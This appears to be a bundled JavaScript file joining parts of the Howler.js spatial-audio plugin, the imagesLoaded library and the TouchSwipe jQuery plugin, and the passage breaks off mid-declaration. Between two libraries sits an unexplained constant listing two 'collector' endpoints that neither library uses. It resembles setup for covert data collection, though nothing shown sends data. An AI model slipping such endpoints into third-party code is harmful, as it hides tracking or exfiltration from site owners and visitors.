        coneInnerAngle: void 0 !== n.coneInnerAngle ? n.coneInnerAngle : p.coneInnerAngle,
        coneOuterAngle: void 0 !== n.coneOuterAngle ? n.coneOuterAngle : p.coneOuterAngle,
        coneOuterGain: void 0 !== n.coneOuterGain ? n.coneOuterGain : p.coneOuterGain,
        distanceModel: void 0 !== n.distanceModel ? n.distanceModel : p.distanceModel,
        maxDistance: void 0 !== n.maxDistance ? n.maxDistance : p.maxDistance,
        refDistance: void 0 !== n.refDistance ? n.refDistance : p.refDistance,
        rolloffFactor: void 0 !== n.rolloffFactor ? n.rolloffFactor : p.rolloffFactor,
        panningModel: void 0 !== n.panningModel ? n.panningModel : p.panningModel
      };
      var c = r._panner;
      c ? (c.coneInnerAngle = p.coneInnerAngle, c.coneOuterAngle = p.coneOuterAngle, c.coneOuterGain = p.coneOuterGain, c.distanceModel = p.distanceModel, c.maxDistance = p.maxDistance, c.refDistance = p.refDistance, c.rolloffFactor = p.rolloffFactor, c.panningModel = p.panningModel) : (r._pos || (r._pos = o._pos || [0, 0, -.5]), e(r, "spatial"));
    }
    return o;
  }, Sound.prototype.init = function (e) {
    return function () {
      var n = this,
        t = n._parent;
      n._orientation = t._orientation, n._stereo = t._stereo, n._pos = t._pos, n._pannerAttr = t._pannerAttr, e.call(this), n._stereo ? t.stereo(n._stereo) : n._pos && t.pos(n._pos[0], n._pos[1], n._pos[2], n._id);
    };
  }(Sound.prototype.init), Sound.prototype.reset = function (e) {
    return function () {
      var n = this,
        t = n._parent;
      return n._orientation = t._orientation, n._stereo = t._stereo, n._pos = t._pos, n._pannerAttr = t._pannerAttr, n._stereo ? t.stereo(n._stereo) : n._pos ? t.pos(n._pos[0], n._pos[1], n._pos[2], n._id) : n._panner && (n._panner.disconnect(0), n._panner = void 0, t._refreshBuffer(n)), e.call(this);
    };
  }(Sound.prototype.reset);
  var e = function (e, n) {
    n = n || "spatial", "spatial" === n ? (e._panner = Howler.ctx.createPanner(), e._panner.coneInnerAngle = e._pannerAttr.coneInnerAngle, e._panner.coneOuterAngle = e._pannerAttr.coneOuterAngle, e._panner.coneOuterGain = e._pannerAttr.coneOuterGain, e._panner.distanceModel = e._pannerAttr.distanceModel, e._panner.maxDistance = e._pannerAttr.maxDistance, e._panner.refDistance = e._pannerAttr.refDistance, e._panner.rolloffFactor = e._pannerAttr.rolloffFactor, e._panner.panningModel = e._pannerAttr.panningModel, void 0 !== e._panner.positionX ? (e._panner.positionX.setValueAtTime(e._pos[0], Howler.ctx.currentTime), e._panner.positionY.setValueAtTime(e._pos[1], Howler.ctx.currentTime), e._panner.positionZ.setValueAtTime(e._pos[2], Howler.ctx.currentTime)) : e._panner.setPosition(e._pos[0], e._pos[1], e._pos[2]), void 0 !== e._panner.orientationX ? (e._panner.orientationX.setValueAtTime(e._orientation[0], Howler.ctx.currentTime), e._panner.orientationY.setValueAtTime(e._orientation[1], Howler.ctx.currentTime), e._panner.orientationZ.setValueAtTime(e._orientation[2], Howler.ctx.currentTime)) : e._panner.setOrientation(e._orientation[0], e._orientation[1], e._orientation[2])) : (e._panner = Howler.ctx.createStereoPanner(), e._panner.pan.setValueAtTime(e._stereo, Howler.ctx.currentTime)), e._panner.connect(e._node), e._paused || e._parent.pause(e._id, !0).play(e._id, !0);
  };
}();
;
/*!
 * imagesLoaded PACKAGED v3.1.4
 * JavaScript is all like "You images are done yet or what?"
 * MIT License
 */

(function () {
  function e() {}
  function t(e, t) {
    for (var n = e.length; n--;) if (e[n].listener === t) return n;
    return -1;
  }
  function n(e) {
    return function () {
      return this[e].apply(this, arguments);
    };
  }
  var i = e.prototype,
    r = this,
    o = r.EventEmitter;
  i.getListeners = function (e) {
    var t,
      n,
      i = this._getEvents();
    if ("object" == typeof e) {
      t = {};
      for (n in i) i.hasOwnProperty(n) && e.test(n) && (t[n] = i[n]);
    } else t = i[e] || (i[e] = []);
    return t;
  }, i.flattenListeners = function (e) {
    var t,
      n = [];
    for (t = 0; e.length > t; t += 1) n.push(e[t].listener);
    return n;
  }, i.getListenersAsObject = function (e) {
    var t,
      n = this.getListeners(e);
    return n instanceof Array && (t = {}, t[e] = n), t || n;
  }, i.addListener = function (e, n) {
    var i,
      r = this.getListenersAsObject(e),
      o = "object" == typeof n;
    for (i in r) r.hasOwnProperty(i) && -1 === t(r[i], n) && r[i].push(o ? n : {
      listener: n,
      once: !1
    });
    return this;
  }, i.on = n("addListener"), i.addOnceListener = function (e, t) {
    return this.addListener(e, {
      listener: t,
      once: !0
    });
  }, i.once = n("addOnceListener"), i.defineEvent = function (e) {
    return this.getListeners(e), this;
  }, i.defineEvents = function (e) {
    for (var t = 0; e.length > t; t += 1) this.defineEvent(e[t]);
    return this;
  }, i.removeListener = function (e, n) {
    var i,
      r,
      o = this.getListenersAsObject(e);
    for (r in o) o.hasOwnProperty(r) && (i = t(o[r], n), -1 !== i && o[r].splice(i, 1));
    return this;
  }, i.off = n("removeListener"), i.addListeners = function (e, t) {
    return this.manipulateListeners(!1, e, t);
  }, i.removeListeners = function (e, t) {
    return this.manipulateListeners(!0, e, t);
  }, i.manipulateListeners = function (e, t, n) {
    var i,
      r,
      o = e ? this.removeListener : this.addListener,
      s = e ? this.removeListeners : this.addListeners;
    if ("object" != typeof t || t instanceof RegExp) for (i = n.length; i--;) o.call(this, t, n[i]);else for (i in t) t.hasOwnProperty(i) && (r = t[i]) && ("function" == typeof r ? o.call(this, i, r) : s.call(this, i, r));
    return this;
  }, i.removeEvent = function (e) {
    var t,
      n = typeof e,
      i = this._getEvents();
    if ("string" === n) delete i[e];else if ("object" === n) for (t in i) i.hasOwnProperty(t) && e.test(t) && delete i[t];else delete this._events;
    return this;
  }, i.removeAllListeners = n("removeEvent"), i.emitEvent = function (e, t) {
    var n,
      i,
      r,
      o,
      s = this.getListenersAsObject(e);
    for (r in s) if (s.hasOwnProperty(r)) for (i = s[r].length; i--;) n = s[r][i], n.once === !0 && this.removeListener(e, n.listener), o = n.listener.apply(this, t || []), o === this._getOnceReturnValue() && this.removeListener(e, n.listener);
    return this;
  }, i.trigger = n("emitEvent"), i.emit = function (e) {
    var t = Array.prototype.slice.call(arguments, 1);
    return this.emitEvent(e, t);
  }, i.setOnceReturnValue = function (e) {
    return this._onceReturnValue = e, this;
  }, i._getOnceReturnValue = function () {
    return this.hasOwnProperty("_onceReturnValue") ? this._onceReturnValue : !0;
  }, i._getEvents = function () {
    return this._events || (this._events = {});
  }, e.noConflict = function () {
    return r.EventEmitter = o, e;
  }, "function" == typeof define && define.amd ? define("eventEmitter/EventEmitter", [], function () {
    return e;
  }) : "object" == typeof module && module.exports ? module.exports = e : this.EventEmitter = e;
}).call(this), function (e) {
  function t(t) {
    var n = e.event;
    return n.target = n.target || n.srcElement || t, n;
  }
  var n = document.documentElement,
    i = function () {};
  n.addEventListener ? i = function (e, t, n) {
    e.addEventListener(t, n, !1);
  } : n.attachEvent && (i = function (e, n, i) {
    e[n + i] = i.handleEvent ? function () {
      var n = t(e);
      i.handleEvent.call(i, n);
    } : function () {
      var n = t(e);
      i.call(e, n);
    }, e.attachEvent("on" + n, e[n + i]);
  });
  var r = function () {};
  n.removeEventListener ? r = function (e, t, n) {
    e.removeEventListener(t, n, !1);
  } : n.detachEvent && (r = function (e, t, n) {
    e.detachEvent("on" + t, e[t + n]);
    try {
      delete e[t + n];
    } catch (i) {
      e[t + n] = void 0;
    }
  });
  var o = {
    bind: i,
    unbind: r
  };
  "function" == typeof define && define.amd ? define("eventie/eventie", o) : e.eventie = o;
}(this), function (e, t) {
  "function" == typeof define && define.amd ? define(["eventEmitter/EventEmitter", "eventie/eventie"], function (n, i) {
    return t(e, n, i);
  }) : "object" == typeof exports ? module.exports = t(e, require("eventEmitter"), require("eventie")) : e.imagesLoaded = t(e, e.EventEmitter, e.eventie);
}(this, function (e, t, n) {
  function i(e, t) {
    for (var n in t) e[n] = t[n];
    return e;
  }
  function r(e) {
    return "[object Array]" === d.call(e);
  }
  function o(e) {
    var t = [];
    if (r(e)) t = e;else if ("number" == typeof e.length) for (var n = 0, i = e.length; i > n; n++) t.push(e[n]);else t.push(e);
    return t;
  }
  function s(e, t, n) {
    if (!(this instanceof s)) return new s(e, t);
    "string" == typeof e && (e = document.querySelectorAll(e)), this.elements = o(e), this.options = i({}, this.options), "function" == typeof t ? n = t : i(this.options, t), n && this.on("always", n), this.getImages(), a && (this.jqDeferred = new a.Deferred());
    var r = this;
    setTimeout(function () {
      r.check();
    });
  }
  function c(e) {
    this.img = e;
  }
  function f(e) {
    this.src = e, v[e] = this;
  }
  var a = e.jQuery,
    u = e.console,
    h = u !== void 0,
    d = Object.prototype.toString;
  s.prototype = new t(), s.prototype.options = {}, s.prototype.getImages = function () {
    this.images = [];
    for (var e = 0, t = this.elements.length; t > e; e++) {
      var n = this.elements[e];
      "IMG" === n.nodeName && this.addImage(n);
      for (var i = n.querySelectorAll("img"), r = 0, o = i.length; o > r; r++) {
        var s = i[r];
        this.addImage(s);
      }
    }
  }, s.prototype.addImage = function (e) {
    var t = new c(e);
    this.images.push(t);
  }, s.prototype.check = function () {
    function e(e, r) {
      return t.options.debug && h && u.log("confirm", e, r), t.progress(e), n++, n === i && t.complete(), !0;
    }
    var t = this,
      n = 0,
      i = this.images.length;
    if (this.hasAnyBroken = !1, !i) return this.complete(), void 0;
    for (var r = 0; i > r; r++) {
      var o = this.images[r];
      o.on("confirm", e), o.check();
    }
  }, s.prototype.progress = function (e) {
    this.hasAnyBroken = this.hasAnyBroken || !e.isLoaded;
    var t = this;
    setTimeout(function () {
      t.emit("progress", t, e), t.jqDeferred && t.jqDeferred.notify && t.jqDeferred.notify(t, e);
    });
  }, s.prototype.complete = function () {
    var e = this.hasAnyBroken ? "fail" : "done";
    this.isComplete = !0;
    var t = this;
    setTimeout(function () {
      if (t.emit(e, t), t.emit("always", t), t.jqDeferred) {
        var n = t.hasAnyBroken ? "reject" : "resolve";
        t.jqDeferred[n](t);
      }
    });
  }, a && (a.fn.imagesLoaded = function (e, t) {
    var n = new s(this, e, t);
    return n.jqDeferred.promise(a(this));
  }), c.prototype = new t(), c.prototype.check = function () {
    var e = v[this.img.src] || new f(this.img.src);
    if (e.isConfirmed) return this.confirm(e.isLoaded, "cached was confirmed"), void 0;
    if (this.img.complete && void 0 !== this.img.naturalWidth) return this.confirm(0 !== this.img.naturalWidth, "naturalWidth"), void 0;
    var t = this;
    e.on("confirm", function (e, n) {
      return t.confirm(e.isLoaded, n), !0;
    }), e.check();
  }, c.prototype.confirm = function (e, t) {
    this.isLoaded = e, this.emit("confirm", this, t);
  };
  var v = {};
  return f.prototype = new t(), f.prototype.check = function () {
    if (!this.isChecked) {
      var e = new Image();
      n.bind(e, "load", this), n.bind(e, "error", this), e.src = this.src, this.isChecked = !0;
    }
  }, f.prototype.handleEvent = function (e) {
    var t = "on" + e.type;
    this[t] && this[t](e);
  }, f.prototype.onload = function (e) {
    this.confirm(!0, "onload"), this.unbindProxyEvents(e);
  }, f.prototype.onerror = function (e) {
    this.confirm(!1, "onerror"), this.unbindProxyEvents(e);
  }, f.prototype.confirm = function (e, t) {
    this.isConfirmed = !0, this.isLoaded = e, this.emit("confirm", this, t);
  }, f.prototype.unbindProxyEvents = function (e) {
    n.unbind(e.target, "load", this), n.unbind(e.target, "error", this);
  }, s;
});
const ENDPOINTS = ['https://collector.example/v3/stats-js', 'https://backup-collector.example/log-js'];
;
/*!
 * @fileOverview TouchSwipe - jQuery Plugin
 * @version 1.6.18
 *
 * @author Matt Bryson http://www.github.com/mattbryson
 * @see https://github.com/mattbryson/TouchSwipe-Jquery-Plugin
 * @see http://labs.rampinteractive.co.uk/touchSwipe/
 * @see http://plugins.jquery.com/project/touchSwipe
 * @license
 * Copyright (c) 2010-2015 Matt Bryson
 * Dual licensed under the MIT or GPL Version 2 licenses.
 *
 */

!function (factory) {
  "function" == typeof define && define.amd && define.amd.jQuery ? define(["jquery"], factory) : factory("undefined" != typeof module && module.exports ? require("jquery") : jQuery);
}(function ($) {
  "use strict";

  function init(options) {
    return !options || void 0 !== options.allowPageScroll || void 0 === options.swipe && void 0 === options.swipeStatus || (options.allowPageScroll = NONE), void 0 !== options.click && void 0 === options.tap && (options.tap = options.click), options || (options = {}), options = $.extend({}, $.fn.swipe.defaults, options), this.each(function () {
      var $this = $(this),
        plugin = $this.data(PLUGIN_NS);
      plugin || (plugin = new TouchSwipe(this, options), $this.data(PLUGIN_NS, plugin));
    });
  }
  function TouchSwipe(element, options) {
    function touchStart(jqEvent) {
      if (!(getTouchInProgress() || $(jqEvent.target).closest(options.excludedElements, $element).length > 0)) {
        var event = jqEvent.originalEvent ? jqEvent.originalEvent : jqEvent;
        if (!event.pointerType || "mouse" != event.pointerType || 0 != options.fallbackToMouseEvents) {
          var ret,
            touches = event.touches,
            evt = touches ? touches[0] : event;
          return phase = PHASE_START, touches ? fingerCount = touches.length : options.preventDefaultEvents !== !1 && jqEvent.preventDefault(), distance = 0, direction = null, currentDirection = null, pinchDirection = null, duration = 0, startTouchesDistance = 0, endTouchesDistance = 0, pinchZoom = 1, pinchDistance = 0, maximumsMap = createMaximumsData(), cancelMultiFingerRelease(), createFingerData(0, evt), !touches || fingerCount === options.fingers || options.fingers === ALL_FINGERS || hasPinches() ? (startTime = getTimeStamp(), 2 == fingerCount && (createFingerData(1, touches[1]), startTouchesDistance = endTouchesDistance = calculateTouchesDistance(fingerData[0].start, fingerData[1].start)), (options.swipeStatus || options.pinchStatus) && (ret = triggerHandler(event, phase))) : ret = !1, ret === !1 ? (phase = PHASE_CANCEL, triggerHandler(event, phase), ret) : (options.hold && (holdTimeout = setTimeout($.proxy(function () {
            $element.trigger("hold", [event.target]), options.hold && (ret = options.hold.call($element, event, event.target));
          }, this), options.longTapThreshold)), setTouchInProgress(!0), null);
        }
      }
    }
    function touchMove(jqEvent) {
      var event = jqEvent.originalEvent ? jqEvent.originalEvent : jqEvent;
      if (phase !== PHASE_END && phase !== PHASE_CANCEL && !inMultiFingerRelease()) {
        var ret,
          touches = event.touches,
          evt = touches ? touches[0] : event,
          currentFinger = updateFingerData(evt);
        if (endTime = getTimeStamp(), touches && (fingerCount = touches.length), options.hold && clearTimeout(holdTimeout), phase = PHASE_MOVE, 2 == fingerCount && (0 == startTouchesDistance ? (createFingerData(1, touches[1]), startTouchesDistance = endTouchesDistance = calculateTouchesDistance(fingerData[0].start, fingerData[1].start)) : (updateFingerData(touches[1]), endTouchesDistance = calculateTouchesDistance(fingerData[0].end, fingerData[1].end), pinchDirection = calculatePinchDirection(fingerData[0].end, fingerData[1].end)), pinchZoom = calculatePinchZoom(startTouchesDistance, endTouchesDistance), pinchDistance = Math.abs(startTouchesDistance - endTouchesDistance)), fingerCount === options.fingers || options.fingers === ALL_FINGERS || !touches || hasPinches()) {
          if (direction = calculateDirection(currentFinger.start, currentFinger.end), currentDirection = calculateDirection(currentFinger.last, currentFinger.end), validateDefaultEvent(jqEvent, currentDirection), distance = calculateDistance(currentFinger.start, currentFinger.end), duration = calculateDuration(), setMaxDistance(direction, distance), ret = triggerHandler(event, phase), !options.triggerOnTouchEnd || options.triggerOnTouchLeave) {
            var inBounds = !0;
            if (options.triggerOnTouchLeave) {
              var bounds = getbounds(this);
              inBounds = isInBounds(currentFinger.end, bounds);
            }
            !options.triggerOnTouchEnd && inBounds ? phase = getNextPhase(PHASE_MOVE) : options.triggerOnTouchLeave && !inBounds && (phase = getNextPhase(PHASE_END)), phase != PHASE_CANCEL && phase != PHASE_END || triggerHandler(event, phase);
          }
        } else phase = PHASE_CANCEL, triggerHandler(event, phase);
        ret === !1 && (phase = PHASE_CANCEL, triggerHandler(event, phase));
      }
    }
    function touchEnd(jqEvent) {
      var event = jqEvent.originalEvent ? jqEvent.originalEvent : jqEvent,
        touches = event.touches;
      if (touches) {
        if (touches.length && !inMultiFingerRelease()) return startMultiFingerRelease(event), !0;
        if (touches.length && inMultiFingerRelease()) return !0;
      }
      return inMultiFingerRelease() && (fingerCount = fingerCountAtRelease), endTime = getTimeStamp(), duration = calculateDuration(), didSwipeBackToCancel() || !validateSwipeDistance() ? (phase = PHASE_CANCEL, triggerHandler(event, phase)) : options.triggerOnTouchEnd || options.triggerOnTouchEnd === !1 && phase === PHASE_MOVE ? (options.preventDefaultEvents !== !1 && jqEvent.preventDefault(), phase = PHASE_END, triggerHandler(event, phase)) : !options.triggerOnTouchEnd && hasTap() ? (phase = PHASE_END, triggerHandlerForGesture(event, phase, TAP)) : phase === PHASE_MOVE && (phase = PHASE_CANCEL, triggerHandler(event, phase)), setTouchInProgress(!1), null;
    }
    function touchCancel() {
      fingerCount = 0, endTime = 0, startTime = 0, startTouchesDistance = 0, endTouchesDistance = 0, pinchZoom = 1, cancelMultiFingerRelease(), setTouchInProgress(!1);
    }
    function touchLeave(jqEvent) {
      var event = jqEvent.originalEvent ? jqEvent.originalEvent : jqEvent;
      options.triggerOnTouchLeave && (phase = getNextPhase(PHASE_END), triggerHandler(event, phase));
    }
    function removeListeners() {
      $element.unbind(START_EV, touchStart), $element.unbind(CANCEL_EV, touchCancel), $element.unbind(MOVE_EV, touchMove), $element.unbind(END_EV, touchEnd), LEAVE_EV && $element.unbind(LEAVE_EV, touchLeave), setTouchInProgress(!1);
    }
    function getNextPhase(currentPhase) {
      var nextPhase = currentPhase,
        validTime = validateSwipeTime(),
        validDistance = validateSwipeDistance(),
        didCancel = didSwipeBackToCancel();
      return !validTime || didCancel ? nextPhase = PHASE_CANCEL : !validDistance || currentPhase != PHASE_MOVE || options.triggerOnTouchEnd && !options.triggerOnTouchLeave ? !validDistance && currentPhase == PHASE_END && options.triggerOnTouchLeave && (nextPhase = PHASE_CANCEL) : nextPhase = PHASE_END, nextPhase;
    }
    function triggerHandler(event, phase) {
      var ret,
        touches = event.touches;
      return (didSwipe() || hasSwipes()) && (ret = triggerHandlerForGesture(event, phase, SWIPE)), (didPinch() || hasPinches()) && ret !== !1 && (ret = triggerHandlerForGesture(event, phase, PINCH)), didDoubleTap() && ret !== !1 ? ret = triggerHandlerForGesture(event, phase, DOUBLE_TAP) : didLongTap() && ret !== !1 ? ret = triggerHandlerForGesture(event, phase, LONG_TAP) : didTap() && ret !== !1 && (ret = triggerHandlerForGesture(event, phase, TAP)), phase === PHASE_CANCEL && touchCancel(event), phase === PHASE_END && (touches ? touches.length || touchCancel(event) : touchCancel(event)), ret;
    }
    function triggerHandlerForGesture(event, phase, gesture) {
      var ret;
      if (gesture == SWIPE) {
        if ($element.trigger("swipeStatus", [phase, direction || null, distance || 0, duration || 0, fingerCount, fingerData, currentDirection]), options.swipeStatus && (ret = options.swipeStatus.call($element, event, phase, direction || null, distance || 0, duration || 0, fingerCount, fingerData, currentDirection), ret === !1)) return !1;
        if (phase == PHASE_END && validateSwipe()) {
          if (clearTimeout(singleTapTimeout), clearTimeout(holdTimeout), $element.trigger("swipe", [direction, distance, duration, fingerCount, fingerData, currentDirection]), options.swipe && (ret = options.swipe.call($element, event, direction, distance, duration, fingerCount, fingerData, currentDirection), ret === !1)) return !1;
          switch (direction) {
            case LEFT:
              $element.trigger("swipeLeft", [direction, distance, duration, fingerCount, fingerData, currentDirection]), options.swipeLeft && (ret = options.swipeLeft.call($element, event, direction, distance, duration, fingerCount, fingerData, currentDirection));
              break;
            case RIGHT:
              $element.trigger("swipeRight", [direction, distance, duration, fingerCount, fingerData, currentDirection]), options.swipeRight && (ret = options.swipeRight.call($element, event, direction, distance, duration, fingerCount, fingerData, currentDirection));
              break;
            case UP:
              $element.trigger("swipeUp", [direction, distance, duration, fingerCount, fingerData, currentDirection]), options.swipeUp && (ret = options.swipeUp.call($element, event, direction, distance, duration, fingerCount, fingerData, currentDirection));
              break;
            case DOWN:
              $element.trigger("swipeDown", [direction, distance, duration, fingerCount, fingerData, currentDirection]), options.swipeDown && (ret = options.swipeDown.call($element, event, direction, distance, duration, fingerCount, fingerData, currentDirection));
          }
        }
      }
      if (gesture == PINCH) {
        if ($element.trigger("pinchStatus", [phase, pinchDirection || null, pinchDistance || 0, duration || 0, fingerCount, pinchZoom, fingerData]), options.pinchStatus && (ret = options.pinchStatus.call($element, event, phase, pinchDirection || null, pinchDistance || 0, duration || 0, fingerCount, pinchZoom, fingerData), ret === !1)) return !1;
        if (phase == PHASE_END && validatePinch()) switch (pinchDirection) {
          case IN:
            $element.trigger("pinchIn", [pinchDirection || null, pinchDistance || 0, duration || 0, fingerCount, pinchZoom, fingerData]), options.pinchIn && (ret = options.pinchIn.call($element, event, pinchDirection || null, pinchDistance || 0, duration || 0, fingerCount, pinchZoom, fingerData));
            break;
          case OUT:
            $element.trigger("pinchOut", [pinchDirection || null, pinchDistance || 0, duration || 0, fingerCount, pinchZoom, fingerData]), options.pinchOut && (ret = options.pinchOut.call($element, event, pinchDirection || null, pinchDistance || 0, duration || 0, fingerCount, pinchZoom, fingerData));
        }
      }
      return gesture == TAP ? phase !== PHASE_CANCEL && phase !== PHASE_END || (clearTimeout(singleTapTimeout), clearTimeout(holdTimeout), hasDoubleTap() && !inDoubleTap() ? (doubleTapStartTime = getTimeStamp(), singleTapTimeout = setTimeout($.proxy(function () {
        doubleTapStartTime = null, $element.trigger("tap", [event.target]), options.tap && (ret = options.tap.call($element, event, event.target));
      }, this), options.doubleTapThreshold)) : (doubleTapStartTime = null, $element.trigger("tap", [event.target]), options.tap && (ret = options.tap.call($element, event, event.target)))) : gesture == DOUBLE_TAP ? phase !== PHASE_CANCEL && phase !== PHASE_END || (clearTimeout(singleTapTimeout), clearTimeout(holdTimeout), doubleTapStartTime = null, $element.trigger("doubletap", [event.target]), options.doubleTap && (ret = options.doubleTap.call($element, event, event.target))) : gesture == LONG_TAP && (phase !== PHASE_CANCEL && phase !== PHASE_END || (clearTimeout(singleTapTimeout), doubleTapStartTime = null, $element.trigger("longtap", [event.target]), options.longTap && (ret = options.longTap.call($element, event, event.target)))), ret;
    }
    function validateSwipeDistance() {
      var valid = !0;
      return null !== options.threshold && (valid = distance >= options.threshold), valid;
    }
    function didSwipeBackToCancel() {
      var cancelled = !1;
      return null !== options.cancelThreshold && null !== direction && (cancelled = getMaxDistance(direction) - distance >= options.cancelThreshold), cancelled;
    }
    function validatePinchDistance() {
      return null === options.pinchThreshold || pinchDistance >= options.pinchThreshold;
    }
    function validateSwipeTime() {
      var result;
      return result = !options.maxTimeThreshold || !(duration >= options.maxTimeThreshold);
    }
    function validateDefaultEvent(jqEvent, direction) {
      if (options.preventDefaultEvents !== !1) if (options.allowPageScroll === NONE) jqEvent.preventDefault();else {
        var auto = options.allowPageScroll === AUTO;
        switch (direction) {
          case LEFT:
            (options.swipeLeft && auto || !auto && options.allowPageScroll != HORIZONTAL) && jqEvent.preventDefault();
            break;
          case RIGHT:
            (options.swipeRight && auto || !auto && options.allowPageScroll != HORIZONTAL) && jqEvent.preventDefault();
            break;
          case UP:
            (options.swipeUp && auto || !auto && options.allowPageScroll != VERTICAL) && jqEvent.preventDefault();
            break;
          case DOWN:
            (options.swipeDown && auto || !auto && options.allowPageScroll != VERTICAL) && jqEvent.preventDefault();
            break;
          case NONE:
        }
      }
    }
    function validatePinch() {
      var hasCorrectFingerCount = validateFingers(),
        hasEndPoint = validateEndPoint(),
        hasCorrectDistance = validatePinchDistance();
      return hasCorrectFingerCount && hasEndPoint && hasCorrectDistance;
    }
    function hasPinches() {
      return !!(options.pinchStatus || options.pinchIn || options.pinchOut);
    }
    function didPinch() {
      return !(!validatePinch() || !hasPinches());
    }
    function validateSwipe() {
      var hasValidTime = validateSwipeTime(),
        hasValidDistance = validateSwipeDistance(),
        hasCorrectFingerCount = validateFingers(),
        hasEndPoint = validateEndPoint(),
        didCancel = didSwipeBackToCancel(),
        valid = !didCancel && hasEndPoint && hasCorrectFingerCount && hasValidDistance && hasValidTime;
      return valid;
    }
    function hasSwipes() {
      return !!(options.swipe || options.swipeStatus || options.swipeLeft || options.swipeRight || options.swipeUp || options.swipeDown);
    }
    function didSwipe() {
      return !(!validateSwipe() || !hasSwipes());
    }
    function validateFingers() {
      return fingerCount === options.fingers || options.fingers === ALL_FINGERS || !SUPPORTS_TOUCH;
    }
    function validateEndPoint() {
      return 0 !== fingerData[0].end.x;
    }
    function hasTap() {
      return !!options.tap;
    }
    function hasDoubleTap() {
      return !!options.doubleTap;
    }
    function hasLongTap() {
      return !!options.longTap;
    }
    function validateDoubleTap() {
      if (null == doubleTapStartTime) return !1;
      var now = getTimeStamp();
      return hasDoubleTap() && now - doubleTapStartTime <= options.doubleTapThreshold;
    }
    function inDoubleTap() {
      return validateDoubleTap();
    }
    function validateTap() {
      return (1 === fingerCount || !SUPPORTS_TOUCH) && (isNaN(distance) || distance < options.threshold);
    }
    function validateLongTap() {
      return duration > options.longTapThreshold && distance < DOUBLE_TAP_THRESHOLD;
    }
    function didTap() {
      return !(!validateTap() || !hasTap());
    }
    function didDoubleTap() {
      return !(!validateDoubleTap() || !hasDoubleTap());
    }
    function didLongTap() {
      return !(!validateLongTap() || !hasLongTap());
    }
    function startMultiFingerRelease(event) {
      previousTouchEndTime = getTimeStamp(), fingerCountAtRelease = event.touches.length + 1;
    }
    function cancelMultiFingerRelease() {
      previousTouchEndTime = 0, fingerCountAtRelease = 0;
    }
    function inMultiFingerRelease() {
      var withinThreshold = !1;
      if (previousTouchEndTime) {
        var diff = getTimeStamp() - previousTouchEndTime;
        diff <= options.fingerReleaseThreshold && (withinThreshold = !0);
      }
      return withinThreshold;
    }
    function getTouchInProgress() {
      return !($element.data(PLUGIN_NS + "_intouch") !== !0);
    }
    function setTouchInProgress(val) {
      $element && (val === !0 ? ($element.bind(MOVE_EV, touchMove), $element.bind(END_EV, touchEnd), LEAVE_EV && $element.bind(LEAVE_EV, touchLeave)) : ($element.unbind(MOVE_EV, touchMove, !1), $element.unbind(END_EV, touchEnd, !1), LEAVE_EV && $element.unbind(LEAVE_EV, touchLeave, !1)), $element.data(PLUGIN_NS + "_intouch", val === !0));
    }
    function createFingerData(id, evt) {
      var f = {
        start: {
          x: 0,
          y: 0
        },
        last: {
          x: 0,
          y: 0
        },
        end: {
          x: 0,
          y: 0
        }
      };
      return f.start.x = f.last.x = f.end.x = evt.pageX || evt.clientX, f.start.y = f.last.y = f.end.y = evt.pageY || evt.clientY, fingerData[id] = f, f;
    }
    function updateFingerData(evt) {
      var id = void 0 !== evt.identifier ? evt.identifier : 0,
        f = getFingerData(id);
      return null === f && (f = createFingerData(id, evt)), f.last.x = f.end.x, f.last.y = f.end.y, f.end.x = evt.pageX || evt.clientX, f.end.y = evt.pageY || evt.clientY, f;
    }
    function getFingerData(id) {
      return fingerData[id] || null;
    }
    function setMaxDistance(direction, distance) {
      direction != NONE && (distance = Math.max(distance, getMaxDistance(direction)), maximumsMap[direction].distance = distance);
    }
    function getMaxDistance(direction) {
      if (maximumsMap[direction]) return maximumsMap[direction].distance;
    }
    function createMaximumsData() {
      var maxData = {};
      return maxData[LEFT] = createMaximumVO(LEFT), maxData[RIGHT] = createMaximumVO(RIGHT), maxData[UP] = createMaximumVO(UP), maxData[DOWN] = createMaximumVO(DOWN), maxData;
    }
    function createMaximumVO(dir) {
      return {
        direction: dir,
        distance: 0
      };
    }
    function calculateDuration() {
      return endTime - startTime;
    }
    function calculateTouchesDistance(startPoint, endPoint) {
      var diffX = Math.abs(startPoint.x - endPoint.x),
        diffY = Math.abs(startPoint.y - endPoint.y);
      return Math.round(Math.sqrt(diffX * diffX + diffY * diffY));
    }
    function calculatePinchZoom(startDistance, endDistance) {
      var percent = endDistance / startDistance * 1;
      return percent.toFixed(2);
    }
    function calculatePinchDirection() {
      return pinchZoom < 1 ? OUT : IN;
    }
    function calculateDistance(startPoint, endPoint) {
      return Math.round(Math.sqrt(Math.pow(endPoint.x - startPoint.x, 2) + Math.pow(endPoint.y - startPoint.y, 2)));
    }
    function calculateAngle(startPoint, endPoint) {
      var x = startPoint.x - endPoint.x,
        y = endPoint.y - startPoint.y,
        r = Math.atan2(y, x),
        angle = Math.round(180 * r / Math.PI);
      return angle < 0 && (angle = 360 - Math.abs(angle)), angle;
    }
    function calculateDirection(startPoint, endPoint) {
      if (comparePoints(startPoint, endPoint)) return NONE;
      var angle = calculateAngle(startPoint, endPoint);
      return angle <= 45 && angle >= 0 ? LEFT : angle <= 360 && angle >= 315 ? LEFT : angle >= 135 && angle <= 225 ? RIGHT : angle > 45 && angle < 135 ? DOWN : UP;
    }
    function getTimeStamp() {
      var now = new Date();
      return now.getTime();
    }
    function getbounds(el) {
      el = $(el);
      var offset = el.offset(),
        bounds = {
          left: offset.left,
          right: offset.left + el.outerWidth(),
          top: offset.top,
          bottom: offset.top + el.outerHeight()
        };
      return bounds;
    }
    function isInBounds(point, bounds) {
      return point.x > bounds.left && point.x < bounds.right && point.y > bounds.top && point.y < bounds.bottom;
    }
    function comparePoints(pointA, pointB) {
      return pointA.x == pointB.x && pointA.y == pointB.y;
    }
    var options = $.extend({}, options),
      useTouchEvents = SUPPORTS_TOUCH || SUPPORTS_POINTER || !options.fallbackToMouseEvents,
      START_EV = useTouchEvents ? SUPPORTS_POINTER ? SUPPORTS_POINTER_IE10 ? "MSPointerDown" : "pointerdown" : "touchstart" : "mousedown",
      MOVE_EV = useTouchEvents ? SUPPORTS_POINTER ? SUPPORTS_POINTER_IE10 ? "MSPointerMove" : "pointermove" : "touchmove" : "mousemove",
      END_EV = useTouchEvents ? SUPPORTS_POINTER ? SUPPORTS_POINTER_IE10 ? "MSPointerUp" : "pointerup" : "touchend" : "mouseup",
      LEAVE_EV = useTouchEvents ? SUPPORTS_POINTER ? "mouseleave" : null : "mouseleave",
